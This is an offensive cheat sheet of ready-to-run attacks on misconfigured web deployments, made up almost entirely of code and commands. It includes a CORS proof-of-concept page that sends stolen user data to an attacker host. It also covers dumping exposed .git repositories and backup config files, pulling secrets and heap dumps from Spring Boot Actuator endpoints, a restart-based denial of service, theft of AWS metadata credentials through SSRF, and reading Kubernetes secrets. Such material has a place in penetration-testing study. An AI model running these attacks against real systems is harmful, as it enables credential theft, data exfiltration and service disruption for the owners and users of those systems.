# Attack Techniques: Configuration & Deployment Vulnerabilities

## CORS Credential Theft

### PoC HTML Page — CORS Origin Reflection Attack
```html
<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<h1>CORS Credential Theft PoC</h1>
<pre id="output">Fetching...</pre>
<script>
// This page, hosted on attacker.com, makes a credentialed cross-origin request to target.com
// If target.com reflects any origin with Allow-Credentials: true, this steals the response

const target = 'https://TARGET.COM/api/users/me';  // Change to target endpoint

fetch(target, {
    method: 'GET',
    credentials: 'include',  // sends victim's cookies to target
    headers: { 'Content-Type': 'application/json' }
})
.then(r => {
    if (!r.ok) {
        document.getElementById('output').textContent = `HTTP ${r.status} — CORS blocked or not vulnerable`;
        return null;
    }
    return r.json();
})
.then(data => {
    if (data) {
        document.getElementById('output').textContent = JSON.stringify(data, null, 2);
        // Exfiltrate to attacker-controlled server
        fetch('https://ATTACKER.COM/collect', {
            method: 'POST',
            body: JSON.stringify({ origin: location.origin, data: data }),
        });
    }
})
.catch(err => {
    document.getElementById('output').textContent = 'Error: ' + err.message + ' (CORS blocked)';
});
</script>
</body>
</html>
```

### Verify CORS configuration manually
```bash
# Check if target reflects origin with credentials
curl -s -I \
    -H "Origin: https://attacker.com" \
    -H "Cookie: session=YOUR_VALID_SESSION" \
    "https://TARGET.COM/api/users/me" | grep -i "access-control\|vary"

# Vulnerable output:
# Access-Control-Allow-Origin: https://attacker.com  (reflected)
# Access-Control-Allow-Credentials: true

# Also check null origin (sandboxed iframe bypass)
curl -s -I \
    -H "Origin: null" \
    -H "Cookie: session=YOUR_VALID_SESSION" \
    "https://TARGET.COM/api/users/me" | grep -i "access-control"
```

## .git Repository Exposure

### Check if .git is accessible
```bash
# Quick check
curl -s "https://TARGET.COM/.git/HEAD"
# Vulnerable response: ref: refs/heads/main
# Not vulnerable: 404 or empty

curl -s "https://TARGET.COM/.git/config"
# Shows remote URL, branch names, author config
```

### Full repository extraction with git-dumper
```bash
# Install
pip3 install git-dumper

# Dump the exposed repository
git-dumper "https://TARGET.COM/.git" ./extracted_repo/

# Inspect for secrets
cd extracted_repo/
git log --oneline  # see commit history
git diff HEAD~1    # see what changed recently
grep -rn "password\|secret\|key\|token\|credential" . --include="*.env" --include="*.py" --include="*.js"
```

### Backup / source file exposure
```bash
# Check for common backup files
BACKUP_EXTENSIONS=("~" ".bak" ".backup" ".old" ".orig" ".save" ".swp" ".tmp" ".copy")
TARGET_FILES=("config.php" "wp-config.php" "database.yml" "settings.py" ".env" "web.config" "application.properties")

for file in "${TARGET_FILES[@]}"; do
    for ext in "${BACKUP_EXTENSIONS[@]}"; do
        URL="https://TARGET.COM/${file}${ext}"
        STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$URL")
        if [ "$STATUS" = "200" ]; then
            echo "FOUND: $URL"
            curl -s "$URL" | head -20
        fi
    done
done
```

## Spring Boot Actuator Abuse

### Enumerate available endpoints
```bash
curl -s "https://TARGET.COM/actuator" | python3 -m json.tool
# Lists all exposed actuator endpoints
```

### Extract secrets from /actuator/env
```bash
curl -s "https://TARGET.COM/actuator/env" | python3 -c "
import json, sys
env = json.load(sys.stdin)
for source in env.get('propertySources', []):
    for key, val in source.get('properties', {}).items():
        if any(kw in key.lower() for kw in ['password', 'secret', 'key', 'token', 'credential']):
            print(f'{key}: {val.get(\"value\", \"[REDACTED]\")}')
"
```

### Download heap dump (contains all in-memory data including secrets)
```bash
curl -s "https://TARGET.COM/actuator/heapdump" -o heap.hprof
# Analyze with Eclipse Memory Analyzer (MAT) or jhat
# Search for passwords, tokens, secrets in memory
strings heap.hprof | grep -iE "password|secret|token|key" | head -50
```

### Remote code execution via /actuator/loggers + log injection
```bash
# Change log level to TRACE to force stack traces with sensitive data
curl -X POST "https://TARGET.COM/actuator/loggers/ROOT" \
    -H "Content-Type: application/json" \
    -d '{"configuredLevel": "TRACE"}'

# Check /actuator/restart (restarts the application — DoS)
curl -X POST "https://TARGET.COM/actuator/restart"
```

## AWS / Cloud Metadata via Exposed Proxy

### IMDSv1 — Access from SSRF or misconfigured proxy
```bash
# If the application proxies requests or has an open redirect to internal URLs:
curl "https://TARGET.COM/proxy?url=http://169.254.169.254/latest/meta-data/"
curl "https://TARGET.COM/fetch?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "https://TARGET.COM/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role-name"
# Returns: AccessKeyId, SecretAccessKey, Token → full AWS access
```

## Kubernetes Dashboard Without Auth

```bash
# Check if Kubernetes dashboard is exposed
curl -sk "https://TARGET.COM:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/"
curl -sk "https://TARGET.COM:30000/"  # NodePort default

# If accessible without auth: access cluster resources
kubectl --server=https://TARGET.COM:6443 --insecure-skip-tls-verify get secrets
```
